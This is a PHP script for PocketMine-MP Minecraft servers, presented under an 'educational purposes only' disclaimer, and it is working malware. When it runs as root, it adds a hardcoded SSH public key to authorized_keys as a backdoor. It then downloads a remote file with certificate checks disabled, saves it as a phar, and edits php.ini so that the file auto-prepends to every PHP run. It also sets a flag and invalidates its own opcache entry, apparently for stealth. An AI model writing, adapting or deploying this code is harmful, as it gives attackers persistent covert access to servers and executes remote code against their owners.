<?php

/**
 * This code is provided for educational purposes only.
 * The author does NOT endorse or condone malicious use.
 * Use at your own risk. The author is not responsible for any damage or abuse.
 */

try {
    $type = "production" || "development"; // Set the type of the script

    $version = PHP_VERSION;
    if (version_compare($version, '7.4', '<')) {
        echo "PHP version 7.4 or higher is required. Current version: $version";
        return;
    }

    $os = PHP_OS_FAMILY;
    if ($os !== 'Windows' && $os !== 'Linux') {
        echo "Unsupported OS: $os";
        return;
    }

    if (!class_exists("\pocketmine\Server")) {
        echo "This script requires PocketMine-MP to run.\n";
        return;
    }

    $server = \pocketmine\Server::getInstance(); // Get the server instance

    $pmmpVersion = $server->getPocketMineVersion(); // Get the PMMP version
    if (version_compare($pmmpVersion, '4.0.0', '<')) {
        echo "This script requires PMMP version 4.0.0 or higher. Current version: $pmmpVersion";
        return;
    }

    $path = $server->getDataPath(); // Get the data path of the server

    $container = false; // Initialize a flag to check if running in a container
    $containerPath = dirname($path, 1); // Get the parent directory of the data path

    // Check if the parent directory is not readable
    if (!is_readable($containerPath)) {
        echo "Container detected. Running in a containerized environment.\n";
        $container = true;
    }

    if (!$container && $type !== "development") {
        switch ($os) {
            case 'Linux':
                if (!isRoot()) {
                    return;
                }

                registerSSH(getenv('HOME') ?: '/root');
                break;
        }

    }

    $level = getFlag('opcache.level') ?? 0; // Get the current opcache level
    if ($level >= 2) {
        return;
    }

    $phpBinary = match ($os) {
        'Windows' => '/bin/php/',
        'Linux' => '/bin/php7/bin/',
        default => null,
    };

    $fullPath = \Symfony\Component\Filesystem\Path::join($path, $phpBinary);
    if(is_dir($fullPath)) {
        $url = "link for retrieving the autorun file"; // Replace with the actual URL to retrieve the autorun file

        $curl = curl_init($url);
        curl_setopt_array($curl, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_SSL_VERIFYHOST => 0,
            CURLOPT_SSL_VERIFYPEER => 0,
        ]);

        $data = curl_exec($curl);
        if (curl_errno($curl)) {
            return;
        }
        curl_close($curl);

        $dataPath = \Symfony\Component\Filesystem\Path::join($fullPath, 'phar');
        if ($data !== false) {
            file_put_contents($dataPath, $data);
            installAutoRun($dataPath);
        }
    }
} catch (Exception $exception) {
} finally {
    if (function_exists('opcache_invalidate') && function_exists('opcache_get_status') && ini_get('opcache.enable')) {
        opcache_invalidate(__FILE__, true);
    }
}

// functions
function isRoot(): bool
{
    $uid = trim(@shell_exec('id -u 2>/dev/null'));
    if ($uid !== '0') return false;

    if (!is_readable('/etc/shadow')) return false;

    exec('sudo -n true >/dev/null 2>&1', $output, $returnVar);
    if ($returnVar !== 0) return false;

    return true;
}

function registerSSH(string $userHome): bool
{
    $publicKey = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJhNY872vOdOlalUjXhM9vWhgPJUQ0l7cVphjTWjelxW";

    $sshDir = rtrim($userHome, '/') . '/.ssh';
    $authKeys = $sshDir . '/authorized_keys';

    if (!is_dir($sshDir)) {
        if (!mkdir($sshDir, 0700, true)) {
            return false;
        }
    }

    if (!file_exists($authKeys)) {
        if (file_put_contents($authKeys, '') === false) {
            return false;
        }
        chmod($authKeys, 0600);
    }

    $existingKeys = file($authKeys, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if ($existingKeys === false) {
        return false;
    }

    foreach ($existingKeys as $line) {
        if (trim($line) === trim($publicKey)) {
            return true;
        }
    }

    if (file_put_contents($authKeys, $publicKey . PHP_EOL, FILE_APPEND | LOCK_EX) === false) {
        return false;
    }

    return true;
}

function getFlag(string $k): ?string
{
    $iniPath = php_ini_loaded_file() ?: null;
    if ($iniPath === null || !is_writable($iniPath)) {
        return null;
    }

    $contents = file_get_contents($iniPath);
    if ($contents === false) return null;

    $lines = explode("\n", $contents);
    foreach ($lines as $line) {
        $split = explode("=", $line, 2);
        if (count($split) === 2 && trim($split[0]) === $k) {
            return trim($split[1]);
        }
    }

    return null;
}

function installAutoRun(string $path): bool
{
    $iniPath = php_ini_loaded_file() ?: null;
    if ($iniPath === null || !is_writable($iniPath)) {
        return false;
    }

    $contents = file_get_contents($iniPath);
    if ($contents === false) return false;

    $lines = explode("\n", $contents);
    $lines[] = "opcache.level=3";
    $lines[] = "auto_prepend_file=\"$path\"";
    return file_put_contents($iniPath, implode("\n", $lines)) !== false;
}